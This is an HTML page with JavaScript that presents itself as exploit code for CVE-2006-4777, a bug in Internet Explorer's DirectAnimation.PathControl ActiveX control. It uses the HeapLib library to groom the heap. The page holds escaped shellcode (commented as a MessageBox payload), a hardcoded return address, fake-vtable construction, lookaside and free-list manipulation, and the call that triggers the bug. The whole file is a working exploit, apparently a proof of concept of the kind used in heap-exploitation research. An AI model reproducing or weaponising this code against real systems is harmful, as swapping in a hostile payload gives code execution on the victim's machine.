<!-- saved from url=(0023)http://www.example.com/ -->

<!-- Exploit code for CVE-2006-4777 using HeapLib -->

<html>
<body>

<script type="text/javascript" src="../heapLib.js"></script>
<script type="text/javascript">

    // Create the ActiveX object
    var target = new ActiveXObject("DirectAnimation.PathControl");

    // Initialize the heap library
    var heap = new heapLib.ie();

    // MessageBox shellcode
    var shellcode = unescape("%u326A%uD959%uD9EE%u2474%u5BF4%u7381%u9513%uBACC%u839B%uFCEB%uF4E2%u9A7D%u9BBA%u9F95%uCDEF%u47C2%uBFD6%u478D%uA7FF%u981E%uE3BF%u2694%uD131%u478D%uBBE0%u2794%uA959%u47DC%u108E%u2294%u648B%uFD69%u377A%u2CAD%u9CCE%u0354%u9AB7%u2752%uA048%uE8E9%uEEAE%u4774%uBFE0%u2794%u10DC%u8799%uC131%uCD89%u1051%u4791%u73BB%uCE7E%u5B8B%u92CA%uC0E7%uC457%uC5BA%uFCFF%uFFE3%uD51E%uC031%u4799%u87E1%uD71E%uC031%u9F9D%u15D2%uC2DB%u6456%u4543%u737D%uCC92%u9BBA%u9FC0%uC9FF%uFEA6%u64BA%u9C42%u33D2%u8137%u6406%u2443%u9BA7%uCC95%uCFBA%uA9FD%uFE9A%uBCED%uF4D6%uB8FC%uEC9A%uBFF4%uE89A%uAFE0%uFED9%uBFE6%uEEDC%uEDF9%uC1BA%u05A4%u8BD0%u8EC7%uCAE8%u1C6A%uF3E9%u14EB%uE858%u1A6A%u9BD0%u1C6A%u9BBA");

    // address of jmp ecx instruction in IEXPLORE.EXE
    var jmpecx = 0x4058b5;

    // Build a fake vtable with pointers to the shellcode
    var vtable = heap.vtable(shellcode, jmpecx);

    // Get the address of the lookaside that will point to the vtable
    var fakeObjPtr = heap.lookasideAddr(vtable);

    // Build the heap block with the fake object address
    //
    // len      padding         fake obj pointer  padding   null
    // 4 bytes  0x200C-4 bytes  4 bytes           14 bytes  2 bytes

    var fakeObjChunk = heap.padding((0x200c-4)/2) + heap.addr(fakeObjPtr) +
        heap.padding(14/2);

    heap.gc();
    heap.debugHeap(true);

    // Empty the lookaside
    heap.debug("Emptying the lookaside")
    for (var i = 0; i < 100; i++)
        heap.alloc(vtable)

    // Put the vtable on the lookaise
    heap.debug("Putting the vtable on the lookaside")
    heap.lookaside(vtable);

    // Defragment the heap
    heap.debug("Defragmenting the heap with blocks of size 0x2010")
    for (var i = 0; i < 100; i++)
        heap.alloc(0x2010)

    // Add the block with the fake object pointer to the free list
    heap.debug("Creating two holes of size 0x2020");
    heap.freeList(fakeObjChunk, 2);

    // Trigger the exploit
    target.KeyFrame(0x40000801, new Array(1), new Array(1));

    // Cleanup
    heap.debugHeap(false);
    delete heap;
</script>
</body>
</html>
